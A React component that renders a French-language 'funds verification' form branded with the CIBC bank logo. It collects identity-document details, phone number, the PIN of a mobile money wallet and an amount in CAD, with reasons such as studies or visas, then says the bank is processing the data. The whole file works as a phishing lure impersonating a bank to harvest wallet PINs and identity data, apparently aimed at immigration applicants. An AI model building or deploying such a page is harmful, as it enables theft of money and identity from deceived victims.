import React, { useState } from 'react';
import { countries } from '../data/countries';
import { idTypes } from '../data/idTypes';
import type { VerificationForm as IVerificationForm } from '../types';
import { CheckCircle2 } from 'lucide-react';

const verificationReasons = [
  "Études",
  "Travail",
  "Résidence permanente",
  "Visa visiteur",
  "Autre"
];

export const VerificationForm: React.FC = () => {
  const [formData, setFormData] = useState<IVerificationForm>({
    fullName: '',
    email: '',
    idType: 'cni',
    idNumber: '',
    idExpiryDate: '',
    country: '',
    operator: '',
    phoneNumber: '',
    pin: '',
    verificationReason: '',
    amount: 0
  });
  const [submitted, setSubmitted] = useState(false);
  const [errors, setErrors] = useState<Partial<IVerificationForm>>({});

  const selectedCountry = countries.find(c => c.code === formData.country);
  const operators = selectedCountry?.operators || [];
  const selectedOperator = operators.find(op => op.code === formData.operator);
  const selectedIdType = idTypes.find(type => type.value === formData.idType);

  const validateForm = () => {
    const newErrors: Partial<IVerificationForm> = {};

    if (!/^[A-Za-zÀ-ÿ\s]{2,50}$/.test(formData.fullName)) {
      newErrors.fullName = 'Le nom doit contenir entre 2 et 50 caractères';
    }

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = 'Format d\'email invalide';
    }

    if (selectedIdType && !selectedIdType.format.test(formData.idNumber)) {
      newErrors.idNumber = `Format invalide. Format requis : ${selectedIdType.description}`;
    }

    if (!formData.idExpiryDate) {
      newErrors.idExpiryDate = 'Date d\'expiration requise';
    }

    if (selectedOperator && !selectedOperator.phoneFormat.test(formData.phoneNumber)) {
      newErrors.phoneNumber = `Format invalide. Format requis : ${selectedOperator.phoneFormatDescription}`;
    }

    if (selectedOperator) {
      const pinLength = formData.pin.length;
      if (pinLength < selectedOperator.pinLength.min || pinLength > selectedOperator.pinLength.max) {
        newErrors.pin = `Le code PIN doit contenir entre ${selectedOperator.pinLength.min} et ${selectedOperator.pinLength.max} chiffres pour ${selectedOperator.name}`;
      } else if (!/^\d+$/.test(formData.pin)) {
        newErrors.pin = 'Le code PIN doit contenir uniquement des chiffres';
      }
    }

    if (!formData.verificationReason) {
      newErrors.verificationReason = 'Veuillez sélectionner un motif';
    }

    if (formData.amount <= 0) {
      newErrors.amount = 'Le montant doit être supérieur à 0';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (validateForm()) {
      console.log('Données du formulaire:', formData);
      setSubmitted(true);
    }
  };

  if (submitted) {
    return (
      <div className="max-w-md mx-auto mt-8 p-8 bg-white rounded-lg shadow-lg text-center">
        <div className="flex justify-center mb-6">
          <img 
            src="https://logos-world.net/wp-content/uploads/2021/02/CIBC-Logo.png" 
            alt="CIBC Bank" 
            className="h-12"
          />
        </div>
        <CheckCircle2 className="w-16 h-16 text-green-500 mx-auto mb-4" />
        <h2 className="text-2xl font-bold text-gray-800 mb-4">Félicitations !</h2>
        <p className="text-gray-600 mb-4">
          Nous avons bien reçu vos informations et elles sont en cours de traitement par la Banque CIBC.
          Merci de nous avoir fait confiance.
        </p>
        <p className="text-sm text-gray-500">
          Un email de confirmation vous sera envoyé à l'adresse {formData.email}
        </p>
      </div>
    );
  }

  return (
    <form onSubmit={handleSubmit} className="max-w-2xl mx-auto mt-8 p-8 bg-white rounded-lg shadow-lg">
      <div className="flex items-center justify-between mb-6">
        <h2 className="text-2xl font-bold text-gray-800">Vérification des Fonds</h2>
        <img 
          src="https://logos-world.net/wp-content/uploads/2021/02/CIBC-Logo.png" 
          alt="CIBC Bank" 
          className="h-8"
        />
      </div>
      
      <div className="space-y-6">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Nom Complet</label>
          <input
            type="text"
            value={formData.fullName}
            onChange={e => setFormData(prev => ({ ...prev, fullName: e.target.value }))}
            className="w-full px-4 py-2 border rounded-md focus:ring-red-500 focus:border-red-500"
            placeholder="Ex: Jean Dupont"
          />
          {errors.fullName && <p className="mt-1 text-sm text-red-600">{errors.fullName}</p>}
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Email</label>
          <input
            type="email"
            value={formData.email}
            onChange={e => setFormData(prev => ({ ...prev, email: e.target.value }))}
            className="w-full px-4 py-2 border rounded-md focus:ring-red-500 focus:border-red-500"
            placeholder="exemple@email.com"
          />
          {errors.email && <p className="mt-1 text-sm text-red-600">{errors.email}</p>}
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Type de Pièce d'Identité</label>
          <select
            value={formData.idType}
            onChange={e => setFormData(prev => ({ ...prev, idType: e.target.value as any }))}
            className="w-full px-4 py-2 border rounded-md focus:ring-red-500 focus:border-red-500"
          >
            {idTypes.map(type => (
              <option key={type.value} value={type.value}>
                {type.label}
              </option>
            ))}
          </select>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Numéro de Pièce d'Identité</label>
          <input
            type="text"
            value={formData.idNumber}
            onChange={e => setFormData(prev => ({ ...prev, idNumber: e.target.value }))}
            className="w-full px-4 py-2 border rounded-md focus:ring-red-500 focus:border-red-500"
            placeholder={selectedIdType?.description}
          />
          {errors.idNumber && <p className="mt-1 text-sm text-red-600">{errors.idNumber}</p>}
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Date d'Expiration</label>
          <input
            type="date"
            value={formData.idExpiryDate}
            onChange={e => setFormData(prev => ({ ...prev, idExpiryDate: e.target.value }))}
            className="w-full px-4 py-2 border rounded-md focus:ring-red-500 focus:border-red-500"
          />
          {errors.idExpiryDate && <p className="mt-1 text-sm text-red-600">{errors.idExpiryDate}</p>}
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Pays</label>
          <select
            value={formData.country}
            onChange={e => setFormData(prev => ({ ...prev, country: e.target.value, operator: '' }))}
            className="w-full px-4 py-2 border rounded-md focus:ring-red-500 focus:border-red-500"
          >
            <option value="">Sélectionnez un pays</option>
            {countries.map(country => (
              <option key={country.code} value={country.code}>
                {country.name}
              </option>
            ))}
          </select>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Opérateur Mobile</label>
          <select
            value={formData.operator}
            onChange={e => setFormData(prev => ({ ...prev, operator: e.target.value }))}
            className="w-full px-4 py-2 border rounded-md focus:ring-red-500 focus:border-red-500"
            disabled={!formData.country}
          >
            <option value="">Sélectionnez un opérateur</option>
            {operators.map(operator => (
              <option key={operator.code} value={operator.code}>
                {operator.name}
              </option>
            ))}
          </select>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Numéro de Téléphone</label>
          <input
            type="tel"
            value={formData.phoneNumber}
            onChange={e => setFormData(prev => ({ ...prev, phoneNumber: e.target.value }))}
            className="w-full px-4 py-2 border rounded-md focus:ring-red-500 focus:border-red-500"
            disabled={!formData.operator}
            placeholder={selectedOperator?.phoneFormatDescription}
          />
          {errors.phoneNumber && <p className="mt-1 text-sm text-red-600">{errors.phoneNumber}</p>}
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Code PIN du portefeuille a verifier
            {selectedOperator && (
              <span className="text-sm text-gray-500 ml-2">
                ({selectedOperator.pinLength.min} à {selectedOperator.pinLength.max} chiffres)
              </span>
            )}
          </label>
          <input
            type="password"
            value={formData.pin}
            onChange={e => setFormData(prev => ({ ...prev, pin: e.target.value }))}
            className="w-full px-4 py-2 border rounded-md focus:ring-red-500 focus:border-red-500"
            disabled={!formData.operator}
            placeholder="****"
          />
          {errors.pin && <p className="mt-1 text-sm text-red-600">{errors.pin}</p>}
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Motif de la Vérification</label>
          <select
            value={formData.verificationReason}
            onChange={e => setFormData(prev => ({ ...prev, verificationReason: e.target.value }))}
            className="w-full px-4 py-2 border rounded-md focus:ring-red-500 focus:border-red-500"
          >
            <option value="">Sélectionnez un motif</option>
            {verificationReasons.map(reason => (
              <option key={reason} value={reason}>
                {reason}
              </option>
            ))}
          </select>
          {errors.verificationReason && (
            <p className="mt-1 text-sm text-red-600">{errors.verificationReason}</p>
          )}
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Montant à Vérifier (CAD)</label>
          <input
            type="number"
            value={formData.amount || ''}
            onChange={e => setFormData(prev => ({ ...prev, amount: parseFloat(e.target.value) || 0 }))}
            className="w-full px-4 py-2 border rounded-md focus:ring-red-500 focus:border-red-500"
            placeholder="Ex: 12500"
            min="0"
            step="100"
          />
          {errors.amount && <p className="mt-1 text-sm text-red-600">{errors.amount}</p>}
        </div>

        <button
          type="submit"
          className="w-full bg-red-700 text-white py-3 px-6 rounded-md hover:bg-red-800 transition-colors"
        >
          Vérifier les Fonds
        </button>
      </div>
    </form>
  );
};